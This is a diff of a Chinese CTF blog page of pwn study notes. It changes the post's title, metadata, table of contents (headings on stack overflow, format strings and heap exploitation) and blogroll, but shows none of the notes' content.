@@ -19,53 +19,35 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"4xwi11.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"right","width":320,"display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":"utterances","storage":true,"lazyload":false,"nav":null,"activeClass":"utterances"},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="怕win11又有bug，所以还是先上传一份笔记，一也是方便查看，二防止到时候又丢了 因为自己本地一直在更新有什么格式的问题先不纠正了">
+<meta name="description" content="Pwn的学习笔记，格式问题暂时不纠结">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnSkillTree">
+<meta property="og:title" content="Pwn-TopologyTree">
 <meta property="og:url" content="https://4xwi11.github.io/posts/7769d5fe/index.html">
 <meta property="og:site_name" content="4XWi11的博客">
-<meta property="og:description" content="怕win11又有bug，所以还是先上传一份笔记，一也是方便查看，二防止到时候又丢了 因为自己本地一直在更新有什么格式的问题先不纠正了">
+<meta property="og:description" content="Pwn的学习笔记，格式问题暂时不纠结">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210193836184.png">
+<meta property="og:image" content="g:/4XWi11/source_posts/pwnTree.assets/image-20211218164639699-16398172023881.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211122144640565.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211122153638634.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124115836772.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124114943675.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124153136270.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124200222364.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124155217765.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124155611802.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211124164149380.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201100510725.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201100700020.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201100738927.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201102209210.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201102347265.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201102711462.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211201103754018.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210111545017.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210111427708.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210194311462.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210194925878.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210200011410.png">
-<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210112734815.png">
+<meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211216204901420.png">
+<meta property="og:image" content="g:/4XWi11/source_posts/pwnTree.assets/image-20220104132323887.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213163512389.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211213163435522.png">
 <meta property="article:published_time" content="2021-12-13T10:09:02.000Z">
-<meta property="article:modified_time" content="2022-01-02T16:24:17.693Z">
+<meta property="article:modified_time" content="2022-01-07T03:41:12.626Z">
 <meta property="article:author" content="4XWi11">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211210193836184.png">
+<meta name="twitter:image" content="g:/4XWi11/source_posts/pwnTree.assets/image-20211218164639699-16398172023881.png">
 
 
 <link rel="canonical" href="https://4xwi11.github.io/posts/7769d5fe/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://4xwi11.github.io/posts/7769d5fe/","path":"posts/7769d5fe/","title":"pwnSkillTree"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://4xwi11.github.io/posts/7769d5fe/","path":"posts/7769d5fe/","title":"Pwn-TopologyTree"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>pwnSkillTree | 4XWi11的博客</title>
+<title>Pwn-TopologyTree | 4XWi11的博客</title>
   
 
 
@@ -171,7 +153,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">1.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x101-%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF"><span class="nav-number">1.1.</span> <span class="nav-text">0x101 学习路线</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E6%B1%87%E7%BC%96%E8%AF%AD%E6%B3%95"><span class="nav-number">1.1.1.</span> <span class="nav-text">0x01 汇编语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Intel%E8%AF%AD%E6%B3%95%E5%92%8CAT-amp-T%E8%AF%AD%E6%B3%95%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%88%E5%85%B8%E5%9E%8B%EF%BC%89"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">Intel语法和AT&amp;T语法的区别（典型）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x02 数据类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Python"><span class="nav-number">1.1.3.</span> <span class="nav-text">0x03 Python</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x102-%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">1.2.</span> <span class="nav-text">0x102 栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-ret2shellcode"><span class="nav-number">1.2.1.</span> <span class="nav-text">0x01 ret2shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-ROP"><span class="nav-number">1.2.2.</span> <span class="nav-text">0x02 ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x1-ret2text"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">0x1 ret2text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x2-ret2syscall"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">0x2 ret2syscall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x3-ret2libc"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">0x3 ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#more"><span class="nav-number">1.2.2.3.1.</span> <span class="nav-text">more</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x4-ret2dl"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">0x4 ret2dl</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Canary"><span class="nav-number">1.2.3.</span> <span class="nav-text">0x03 Canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-PIE"><span class="nav-number">1.2.4.</span> <span class="nav-text">0x04  PIE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Partial-Write"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">Partial Write</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BAROP%E9%93%BE%E6%89%93%E4%B8%8D%E9%80%9A"><span class="nav-number">1.2.4.1.1.</span> <span class="nav-text">栈溢出ROP链打不通</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%B3%84%E6%BC%8F%E5%9C%B0%E5%9D%80"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">直接泄漏地址</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-%E5%85%B6%E4%BB%96%E6%BA%A2%E5%87%BA"><span class="nav-number">1.2.5.</span> <span class="nav-text">0x05 其他溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">整数溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AA%E9%99%90%E5%88%B6%E8%8C%83%E5%9B%B4"><span class="nav-number">1.2.5.1.1.</span> <span class="nav-text">未限制范围</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="nav-number">1.2.5.1.2.</span> <span class="nav-text">错误的类型转换</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%88pivoting%EF%BC%89"><span class="nav-number">1.2.6.</span> <span class="nav-text">0x06 栈迁移（pivoting）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x103-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.3.</span> <span class="nav-text">0x103 格式化字符串</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="nav-number">1.3.1.</span> <span class="nav-text">任意地址读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-number">1.3.2.</span> <span class="nav-text">任意地址写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x104-%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="nav-number">1.4.</span> <span class="nav-text">0x104 堆溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="nav-number">1.4.1.</span> <span class="nav-text">glibc内存管理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mian-arena-%E4%B8%8E-no-main-arena"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">mian_arena 与 no_main_arena</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chunk"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bin"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">bin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastbin"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">fastbin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E4%B8%AA%E7%89%B9%E6%AE%8Achunk"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">三个特殊chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sbrk%E5%92%8Cmmap"><span class="nav-number">1.4.1.6.</span> <span class="nav-text">sbrk和mmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%9A%84%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.4.1.7.</span> <span class="nav-text">内存分配的具体步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%9B%9E%E6%94%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="nav-number">1.4.1.8.</span> <span class="nav-text">内存回收的相关知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">1.4.1.9.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UAF"><span class="nav-number">1.4.2.</span> <span class="nav-text">UAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-number">1.4.3.</span> <span class="nav-text">unlink</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Seccomp"><span class="nav-number">1.5.</span> <span class="nav-text">Seccomp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb%E8%B0%83%E8%AF%95-amp-pwngdb%E6%8F%92%E4%BB%B6"><span class="nav-number">1.6.</span> <span class="nav-text">gdb调试 &amp; pwngdb插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96-1"><span class="nav-number">1.7.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BAROP%E9%93%BE%E6%89%93%E4%B8%8D%E9%80%9A%E4%B9%8Blibc-2-27-so%F0%9F%90%95%E9%83%BD%E4%B8%8D%E7%94%A8"><span class="nav-number">1.7.0.1.</span> <span class="nav-text">栈溢出ROP链打不通之libc-2.27.so🐕都不用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn%E7%8E%AF%E5%A2%83docker%E5%8C%96"><span class="nav-number">1.7.0.2.</span> <span class="nav-text">pwn环境docker化</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn-Topology-Tree"><span class="nav-number">1.</span> <span class="nav-text">Pwn Topology Tree</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x100-Matery-of-Tools"><span class="nav-number">1.1.</span> <span class="nav-text">0x100 Matery of Tools</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-gdb%E8%B0%83%E8%AF%95-amp-pwngdb%E6%8F%92%E4%BB%B6"><span class="nav-number">1.1.1.</span> <span class="nav-text">0x01 gdb调试 &amp; pwngdb插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-IDA"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x02 IDA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-pwntools"><span class="nav-number">1.1.3.</span> <span class="nav-text">0x03 pwntools</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x101-Learning-Route"><span class="nav-number">1.2.</span> <span class="nav-text">0x101 Learning Route</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E6%B1%87%E7%BC%96"><span class="nav-number">1.2.1.</span> <span class="nav-text">0x01 汇编</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E4%BF%A1%E6%81%AF%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86"><span class="nav-number">1.2.2.</span> <span class="nav-text">0x02 信息表示与处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Python"><span class="nav-number">1.2.3.</span> <span class="nav-text">0x03 Python</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x102-stack-overflow"><span class="nav-number">1.3.</span> <span class="nav-text">0x102 stack overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">1.3.1.</span> <span class="nav-text">0x00 保护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-ret2shellcode"><span class="nav-number">1.3.2.</span> <span class="nav-text">0x01 ret2shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-ROP"><span class="nav-number">1.3.3.</span> <span class="nav-text">0x02 ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x1-ret2text"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">0x1 ret2text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x2-ret2syscall"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">0x2 ret2syscall</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x3-ret2libc"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">0x3 ret2libc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x4-ret2dl"><span class="nav-number">1.3.3.4.</span> <span class="nav-text">0x4 ret2dl</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Canary"><span class="nav-number">1.3.4.</span> <span class="nav-text">0x03 Canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-PIE"><span class="nav-number">1.3.5.</span> <span class="nav-text">0x04  PIE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Partial-Write"><span class="nav-number">1.3.5.1.</span> <span class="nav-text">Partial Write</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%B3%84%E6%BC%8F%E5%9C%B0%E5%9D%80"><span class="nav-number">1.3.5.2.</span> <span class="nav-text">直接泄漏地址</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-%E5%85%B6%E4%BB%96%E6%BA%A2%E5%87%BA"><span class="nav-number">1.3.6.</span> <span class="nav-text">0x05 其他溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.3.6.1.</span> <span class="nav-text">整数溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AA%E9%99%90%E5%88%B6%E8%8C%83%E5%9B%B4"><span class="nav-number">1.3.6.1.1.</span> <span class="nav-text">未限制范围</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="nav-number">1.3.6.1.2.</span> <span class="nav-text">错误的类型转换</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%88pivoting%EF%BC%89"><span class="nav-number">1.3.7.</span> <span class="nav-text">0x06 栈迁移（pivoting）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x103-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.4.</span> <span class="nav-text">0x103 格式化字符串</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB"><span class="nav-number">1.4.1.</span> <span class="nav-text">任意地址读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="nav-number">1.4.2.</span> <span class="nav-text">任意地址写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#more"><span class="nav-number">1.4.3.</span> <span class="nav-text">more</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="nav-number">1.4.4.</span> <span class="nav-text">如何防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x104-%E5%A0%86%E6%BA%A2%E5%87%BA"><span class="nav-number">1.5.</span> <span class="nav-text">0x104 堆溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="nav-number">1.5.1.</span> <span class="nav-text">glibc内存管理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mian-arena-%E4%B8%8E-no-main-arena"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">mian_arena 与 no_main_arena</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chunk"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bin"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">bin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastbin"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">fastbin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E4%B8%AA%E7%89%B9%E6%AE%8Achunk"><span class="nav-number">1.5.1.5.</span> <span class="nav-text">三个特殊chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sbrk%E5%92%8Cmmap"><span class="nav-number">1.5.1.6.</span> <span class="nav-text">sbrk和mmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%9A%84%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.5.1.7.</span> <span class="nav-text">内存分配的具体步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%9B%9E%E6%94%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="nav-number">1.5.1.8.</span> <span class="nav-text">内存回收的相关知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">1.5.1.9.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UAF"><span class="nav-number">1.5.2.</span> <span class="nav-text">UAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-number">1.5.3.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#heap-extend-and-overlapping"><span class="nav-number">1.5.4.</span> <span class="nav-text">heap extend and overlapping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fast-bin-attack"><span class="nav-number">1.5.5.</span> <span class="nav-text">fast bin attack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn%E8%BF%9B%E9%98%B6"><span class="nav-number">1.6.</span> <span class="nav-text">Pwn进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-orange"><span class="nav-number">1.6.1.</span> <span class="nav-text">House of orange</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-corruption"><span class="nav-number">1.6.2.</span> <span class="nav-text">tcache corruption</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Largebin-attack"><span class="nav-number">1.6.3.</span> <span class="nav-text">Largebin attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Top-chunk-attack"><span class="nav-number">1.6.4.</span> <span class="nav-text">Top chunk attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hijack-stdout"><span class="nav-number">1.6.5.</span> <span class="nav-text">hijack stdout</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Seccomp"><span class="nav-number">1.6.6.</span> <span class="nav-text">Seccomp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kernel-%E5%9F%BA%E7%A1%80"><span class="nav-number">1.6.7.</span> <span class="nav-text">kernel 基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UAF-1"><span class="nav-number">1.6.8.</span> <span class="nav-text">UAF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hijack-SEH"><span class="nav-number">1.6.9.</span> <span class="nav-text">hijack SEH</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-pwn%E7%9A%84%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">1.6.9.1.</span> <span class="nav-text">Windows pwn的环境准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">1.6.9.2.</span> <span class="nav-text">Windows保护机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SEH"><span class="nav-number">1.6.9.3.</span> <span class="nav-text">SEH</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xffe-TASK"><span class="nav-number">1.7.</span> <span class="nav-text">0xffe TASK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xfff-%E5%85%B6%E4%BB%96"><span class="nav-number">1.8.</span> <span class="nav-text">0xfff 其他</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BAROP%E9%93%BE%E6%89%93%E4%B8%8D%E9%80%9A%E4%B9%8Blibc-2-27-so%F0%9F%90%95%E9%83%BD%E4%B8%8D%E6%89%93"><span class="nav-number">1.8.0.1.</span> <span class="nav-text">栈溢出ROP链打不通之libc-2.27.so🐕都不打</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pwn%E7%8E%AF%E5%A2%83docker%E5%8C%96"><span class="nav-number">1.8.0.2.</span> <span class="nav-text">pwn环境docker化</span></a></li></ol></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -186,13 +168,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">69</span>
+          <span class="site-state-item-count">71</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -221,19 +203,28 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://www.yuque.com/jinjinshigekeaigui" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;jinjinshigekeaigui" rel="noopener" target="_blank">j1ang（姜少 Web大师傅）</a>
+          <a href="https://www.yuque.com/jinjinshigekeaigui" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;jinjinshigekeaigui" rel="noopener" target="_blank">j1ang（姜少 Web大师傅得了心病）</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://scr1pt-kid.github.io/" title="https:&#x2F;&#x2F;scr1pt-kid.github.io&#x2F;" rel="noopener" target="_blank">Scr1pt（V&N Misc师傅在做病毒分析）</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="https://www.cnblogs.com/yunqian2017/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunqian2017&#x2F;" rel="noopener" target="_blank">Openg（彭总 Misc之神）</a>
+          <a href="https://www.cnblogs.com/yunqian2017/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunqian2017&#x2F;" rel="noopener" target="_blank">Openg（彭总 Misc之神在考研）</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://blog.csdn.net/qq_53283643?spm=1001.2014.3001.5509" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53283643?spm&#x3D;1001.2014.3001.5509" rel="noopener" target="_blank">mxx307（尚师傅 Crypto担当）</a>
         </li>
         <li class="links-of-blogroll-item">
